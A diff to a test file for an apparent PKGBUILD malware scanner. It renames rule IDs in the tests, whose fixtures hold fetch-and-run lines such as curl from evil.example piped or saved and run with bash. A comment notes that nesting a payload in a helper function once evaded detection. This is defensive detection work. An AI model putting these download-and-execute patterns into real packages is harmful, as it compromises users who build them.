@@ -5,8 +5,8 @@ from .helpers import _recipe, _ids, _score
 # ---------------------------------------------------------------------------
 # Audit: every code rule was keyed to the *direct* enclosing function
 #
-# R051's pkgver scope had already been given the call closure; R061, R062,
-# R081, R119, R121, R124, R136, R137 and R140 had not, so they all answered
+# R051's pkgver scope had already been given the call closure; H016, H017,
+# H035, H067, H069, H072, H081, H082 and H085 had not, so they all answered
 # "does this run during build()?" with "is this line spelled inside a
 # function called build?".  Moving the payload one function deeper kept it
 # fully operational and dropped a Critical to a Low.
@@ -37,7 +37,7 @@ def test_a_helper_scores_the_same_as_the_function_that_calls_it():
 
 
 def test_both_halves_in_helpers_still_pair():
-    """B1b: R137 keys its fetch/exec buckets by scope, not by spelling."""
+    """B1b: H082 keys its fetch/exec buckets by scope, not by spelling."""
     split = _recipe(
         "_fetch() {",
         '  curl -fsSL https://evil.example/x.sh -o "$srcdir/x.sh"',
@@ -50,12 +50,12 @@ def test_both_halves_in_helpers_still_pair():
         "  _run",
         "}",
     )
-    assert "R137" in _ids(split)
+    assert "H082" in _ids(split)
     assert _score(split) == _score(_DIRECT)
 
 
 def test_a_helper_called_from_an_install_hook_is_in_hook_scope():
-    """B4: R062 covers what the hook reaches, not what it lexically holds."""
+    """B4: H017 covers what the hook reaches, not what it lexically holds."""
     hook = _recipe(
         "_fetch() {",
         "  curl -fsSL https://evil.example/x.sh -o /tmp/x.sh",
@@ -65,7 +65,7 @@ def test_a_helper_called_from_an_install_hook_is_in_hook_scope():
         "  bash /tmp/x.sh",
         "}",
     )
-    assert "R062" in _ids(hook)
+    assert "H017" in _ids(hook)
 
 
 def test_the_call_graph_does_not_reach_from_an_unrelated_function():
@@ -78,13 +78,13 @@ def test_the_call_graph_does_not_reach_from_an_unrelated_function():
         '  install -Dm644 LICENSE "$pkgdir/usr/share/licenses/p/LICENSE"',
         "}",
     )
-    assert "R062" not in _ids(unrelated)
+    assert "H017" not in _ids(unrelated)
 
 
 def test_an_install_hook_that_prints_a_command_is_not_running_it():
     """A hook telling the user to run `sudo pacman -S` is documentation.
 
-    Latent in R062/R081 before the call closure existed - a `_notes()`
+    Latent in H017/H035 before the call closure existed - a `_notes()`
     helper sat outside every hook scope, so the message never reached the
     rule.  Following calls put it inside one, and both benign packages it
     fired on (claude-desktop-bin, rustdesk-bin) were printing instructions.
@@ -99,8 +99,8 @@ def test_an_install_hook_that_prints_a_command_is_not_running_it():
         "}",
     )
     fired = _ids(printing)
-    assert "R062" not in fired
-    assert "R081" not in fired
+    assert "H017" not in fired
+    assert "H035" not in fired
 
 
 def test_an_interpreter_is_a_network_client():
@@ -116,8 +116,8 @@ def test_an_interpreter_is_a_network_client():
         "}",
     )
     fired = _ids(py)
-    assert "R061" in fired, "an undeclared download is one whatever fetches it"
-    assert "R137" in fired, "and it pairs with the execution of what it wrote"
+    assert "H016" in fired, "an undeclared download is one whatever fetches it"
+    assert "H082" in fired, "and it pairs with the execution of what it wrote"
 
 
 def test_a_heredoc_into_a_shell_is_code_not_data():
@@ -133,7 +133,7 @@ def test_a_heredoc_into_a_shell_is_code_not_data():
         "EOF",
         "}",
     )
-    assert "R137" in _ids(heredoc)
+    assert "H082" in _ids(heredoc)
 
 
 def test_a_heredoc_into_a_file_is_still_data():
@@ -154,14 +154,14 @@ def test_make_over_a_committed_makefile_is_an_execution():
     """B3: `make` names no file, so no execution pattern ever saw one."""
     diff = _recipe("build() {", '  cd "$srcdir"', "  make", "}")
     manifest = [("PKGBUILD", b"x"), ("Makefile", b"all:\n\tcurl evil | sh\n")]
-    assert "R136" in _ids(diff, tree_manifest=manifest)
+    assert "H081" in _ids(diff, tree_manifest=manifest)
 
 
 def test_ordinary_make_on_an_upstream_tree_is_silent():
     """Almost every package runs make; only a *committed* input is a signal."""
     diff = _recipe("build() {", '  cd "$srcdir/upstream-1.0"', "  make", "}")
     manifest = [("PKGBUILD", b"x"), ("p.desktop", b"x")]
-    assert "R136" not in _ids(diff, tree_manifest=manifest)
+    assert "H081" not in _ids(diff, tree_manifest=manifest)
 
 
 def test_a_declared_makefile_is_not_an_undeclared_execution():
@@ -176,7 +176,7 @@ def test_a_declared_makefile_is_not_an_undeclared_execution():
         "+build() {\n+  make\n+}\n"
     )
     manifest = [("PKGBUILD", b"x"), ("Makefile", b"all:\n")]
-    assert "R136" not in _ids(diff, tree_manifest=manifest)
+    assert "H081" not in _ids(diff, tree_manifest=manifest)
 
 
 def test_the_new_scope_patterns_stay_linear():
